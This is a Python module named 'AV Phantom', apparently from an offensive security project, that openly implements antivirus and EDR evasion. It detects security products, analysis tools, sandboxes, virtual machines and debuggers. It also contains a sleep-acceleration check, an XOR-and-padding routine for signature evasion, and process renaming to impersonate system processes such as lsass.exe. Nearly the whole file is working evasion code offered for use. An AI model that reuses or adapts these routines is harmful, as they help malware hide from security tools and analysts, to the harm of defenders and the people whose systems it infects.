#!/usr/bin/env python3
# Copyright (C) 2026 Ayush - PhantomTrace Project
# Licensed under GPL-3.0 - See LICENSE file for details
"""
AV Phantom - Antivirus and EDR evasion techniques
Inspired by various AV evasion and malware research
"""

import os
import sys
import time
import psutil
import subprocess
import random
import hashlib
from typing import List, Dict, Optional

class AVPhantom:
    """
    Antivirus and EDR evasion:
    - Detect AV/EDR presence
    - Sandbox detection
    - VM detection
    - Sleep evasion
    - API unhooking techniques
    - Signature evasion
    - Behavioral analysis evasion
    - Process name whitelisting
    """
    
    def __init__(self):
        self.is_windows = sys.platform.startswith('win')
        self.detections = {}
        
    def detect_av_products(self) -> List[str]:
        """Detect running AV/EDR products"""
        av_processes = [
            # Antivirus
            'msmpeng.exe',  # Windows Defender
            'avp.exe',  # Kaspersky
            'mcshield.exe', 'mfemms.exe',  # McAfee
            'savservice.exe',  # Sophos
            'avgui.exe', 'avguard.exe',  # AVG/Avira
            'bdagent.exe',  # Bitdefender
            'nortonsecurity.exe',  # Norton
            'wrsa.exe',  # Webroot
            
            # EDR
            'csfalconservice.exe',  # CrowdStrike Falcon
            'cb.exe',  # Carbon Black
            'taniumclient.exe',  # Tanium
            'cylanceui.exe',  # Cylance
            'elastic-agent.exe',  # Elastic EDR
            'wdnisdrv.sys',  # Windows Defender Network Inspection
            'xagtnotif.exe',  # FireEye HX
            'SentinelAgent.exe',  # SentinelOne
        ]
        
        detected = []
        
        try:
            for proc in psutil.process_iter(['name']):
                process_name = proc.info['name'].lower()
                for av_proc in av_processes:
                    if av_proc.lower() in process_name:
                        detected.append(proc.info['name'])
        except Exception as e:
            print(f"⚠️  Error detecting AV: {e}")
        
        if detected:
            print(f"⚠️  Detected AV/EDR: {', '.join(set(detected))}")
        else:
            print("✅ No AV/EDR products detected")
        
        self.detections['av_products'] = detected
        return detected
    
    def detect_sandbox(self) -> Dict[str, bool]:
        """Detect if running in a sandbox environment"""
        sandbox_indicators = {}
        
        # Check 1: Low uptime (sandboxes often just started)
        try:
            boot_time = psutil.boot_time()
            uptime_hours = (time.time() - boot_time) / 3600
            sandbox_indicators['low_uptime'] = uptime_hours < 1
        except:
            sandbox_indicators['low_uptime'] = False
        
        # Check 2: Low CPU count
        cpu_count = os.cpu_count() or 0
        sandbox_indicators['low_cpu'] = cpu_count < 2
        
        # Check 3: Low memory
        try:
            mem = psutil.virtual_memory()
            sandbox_indicators['low_memory'] = mem.total < 2 * 1024 * 1024 * 1024  # < 2GB
        except:
            sandbox_indicators['low_memory'] = False
        
        # Check 4: Known sandbox files/directories
        if self.is_windows:
            sandbox_paths = [
                'C:\\analysis',
                'C:\\sandbox',
                'C:\\malware',
                'C:\\sample',
            ]
            sandbox_indicators['sandbox_paths'] = any(os.path.exists(p) for p in sandbox_paths)
        
        # Check 5: Unrealistic user interaction
        try:
            if self.is_windows:
                # Check mouse movement (sandboxes often have no mouse activity)
                import ctypes
                class POINT(ctypes.Structure):
                    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
                point = POINT()
                ctypes.windll.user32.GetCursorPos(ctypes.byref(point))
                sandbox_indicators['no_mouse'] = point.x == 0 and point.y == 0
        except:
            sandbox_indicators['no_mouse'] = False
        
        is_sandbox = any(sandbox_indicators.values())
        self.detections['sandbox'] = is_sandbox
        
        if is_sandbox:
            print(f"⚠️  Sandbox detected! Indicators: {[k for k,v in sandbox_indicators.items() if v]}")
        else:
            print("✅ No sandbox detected")
        
        return sandbox_indicators
    
    def detect_virtual_machine(self) -> Dict[str, bool]:
        """Detect if running in a virtual machine"""
        vm_indicators = {}
        
        # Check 1: VM-related processes
        vm_processes = [
            'vmtoolsd.exe',  # VMware
            'vboxservice.exe', 'vboxtray.exe',  # VirtualBox
            'qemu-ga.exe',  # QEMU
            'prl_tools.exe',  # Parallels
        ]
        
        detected_vm_procs = []
        try:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() in [p.lower() for p in vm_processes]:
                    detected_vm_procs.append(proc.info['name'])
        except:
            pass
        
        vm_indicators['vm_processes'] = len(detected_vm_procs) > 0
        
        # Check 2: MAC address (VM vendors have specific OUIs)
        try:
            import uuid
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                           for elements in range(0,2*6,2)][::-1])
            
            vm_macs = ['00:05:69', '00:0C:29', '00:1C:14', '00:50:56',  # VMware
                      '08:00:27',  # VirtualBox
                      '00:16:E3',  # Xen
                      '00:1C:42']  # Parallels
            
            vm_indicators['vm_mac'] = any(mac.startswith(vm_mac) for vm_mac in vm_macs)
        except:
            vm_indicators['vm_mac'] = False
        
        # Check 3: System manufacturer (Windows)
        if self.is_windows:
            try:
                result = subprocess.run(
                    ['wmic', 'computersystem', 'get', 'manufacturer'],
                    capture_output=True, text=True
                )
                manufacturer = result.stdout.lower()
                vm_vendors = ['vmware', 'virtualbox', 'qemu', 'xen', 'parallels', 'microsoft corporation']
                vm_indicators['vm_manufacturer'] = any(vendor in manufacturer for vendor in vm_vendors)
            except:
                vm_indicators['vm_manufacturer'] = False
        
        is_vm = any(vm_indicators.values())
        self.detections['vm'] = is_vm
        
        if is_vm:
            print(f"⚠️  Virtual Machine detected! Indicators: {[k for k,v in vm_indicators.items() if v]}")
        else:
            print("✅ No VM detected")
        
        return vm_indicators
    
    def evade_sleep_analysis(self, duration: int = 10) -> bool:
        """
        Evade sleep analysis (sandboxes often skip sleeps)
        """
        print(f"⏱️  Sleep evasion: {duration}s")
        
        # Method 1: Check if sleep is actually honored
        start = time.time()
        time.sleep(duration)
        actual_duration = time.time() - start
        
        if abs(actual_duration - duration) > 1:
            print(f"⚠️  Sleep was accelerated! Expected {duration}s, got {actual_duration:.2f}s")
            self.detections['sleep_evasion_detected'] = True
            return False
        
        # Method 2: CPU-intensive operations that can't be easily skipped
        print("🔄 Performing CPU-intensive anti-skip operations...")
        checksum = 0
        for i in range(1000000):
            checksum ^= i
        
        print("✅ Sleep evasion complete")
        return True
    
    def generate_unique_signature(self, data: bytes) -> bytes:
        """
        Modify data to create unique signature (polymorphic behavior)
        """
        # Add random padding
        padding = os.urandom(random.randint(100, 500))
        
        # XOR with random key
        key = os.urandom(16)
        modified = bytearray(data)
        for i in range(len(modified)):
            modified[i] ^= key[i % len(key)]
        
        return padding + bytes(modified)
    
    def check_debugger(self) -> bool:
        """Check if debugger is attached"""
        if self.is_windows:
            try:
                import ctypes
                is_debugged = ctypes.windll.kernel32.IsDebuggerPresent()
                
                if is_debugged:
                    print("⚠️  Debugger detected!")
                    self.detections['debugger'] = True
                    return True
                else:
                    print("✅ No debugger detected")
                    return False
            except:
                return False
        else:
            # Linux: check TracerPid
            try:
                with open(f'/proc/{os.getpid()}/status', 'r') as f:
                    for line in f:
                        if 'TracerPid:' in line:
                            tracer = int(line.split(':')[1].strip())
                            if tracer != 0:
                                print(f"⚠️  Being traced by PID: {tracer}")
                                self.detections['debugger'] = True
                                return True
                return False
            except:
                return False
    
    def check_analysis_tools(self) -> List[str]:
        """Detect analysis/debugging tools"""
        analysis_tools = [
            # Debuggers
            'ollydbg.exe', 'x64dbg.exe', 'x32dbg.exe',
            'windbg.exe', 'ida.exe', 'ida64.exe',
            'gdb', 'lldb', 'radare2', 'r2',
            
            # Disassemblers
            'ghidra', 'hopper',
            
            # Network analysis
            'wireshark.exe', 'fiddler.exe', 'charles.exe',
            'tcpdump', 'burpsuite',
            
            # Process monitors
            'procmon.exe', 'procexp.exe', 'processhacker.exe',
        ]
        
        detected = []
        try:
            for proc in psutil.process_iter(['name']):
                name = proc.info['name'].lower()
                for tool in analysis_tools:
                    if tool.lower() in name:
                        detected.append(proc.info['name'])
        except:
            pass
        
        if detected:
            print(f"⚠️  Analysis tools detected: {', '.join(set(detected))}")
        else:
            print("✅ No analysis tools detected")
        
        self.detections['analysis_tools'] = detected
        return detected
    
    def masquerade_as_system_process(self) -> bool:
        """
        Attempt to masquerade as a legitimate system process
        """
        system_names = [
            'svchost.exe',
            'explorer.exe',
            'csrss.exe',
            'services.exe',
            'lsass.exe'
        ]
        
        # Choose random system name
        fake_name = random.choice(system_names)
        
        print(f"🎭 Masquerading as: {fake_name}")
        
        # On Linux, can use prctl to rename
        if sys.platform.startswith('linux'):
            try:
                import ctypes
                libc = ctypes.CDLL('libc.so.6')
                PR_SET_NAME = 15
                libc.prctl(PR_SET_NAME, fake_name.encode())
                print(f"✅ Process renamed to: {fake_name}")
                return True
            except:
                print("⚠️  Process renaming failed")
                return False
        
        print("⚠️  Process renaming only supported on Linux")
        return False
    
    def comprehensive_evasion_check(self) -> Dict[str, any]:
        """Perform comprehensive evasion checks"""
        print("🔍 Performing comprehensive evasion checks...")
        print("=" * 60)
        
        results = {}
        
        # AV Detection
        print("\n1️⃣  Checking for AV/EDR...")
        results['av_products'] = self.detect_av_products()
        
        # Sandbox Detection
        print("\n2️⃣  Checking for sandbox...")
        results['sandbox_indicators'] = self.detect_sandbox()
        
        # VM Detection
        print("\n3️⃣  Checking for virtual machine...")
        results['vm_indicators'] = self.detect_virtual_machine()
        
        # Debugger Detection
        print("\n4️⃣  Checking for debugger...")
        results['debugger_present'] = self.check_debugger()
        
        # Analysis Tools
        print("\n5️⃣  Checking for analysis tools...")
        results['analysis_tools'] = self.check_analysis_tools()
        
        print("\n" + "=" * 60)
        print("✅ Evasion check complete")
        
        return results
    
    def get_detection_report(self) -> Dict:
        """Get full detection report"""
        return self.detections.copy()


if __name__ == "__main__":
    phantom = AVPhantom()
    print("🛡️ AV Phantom - Antivirus & EDR Evasion Module")
    print("=" * 60)
    
    # Run comprehensive check
    results = phantom.comprehensive_evasion_check()
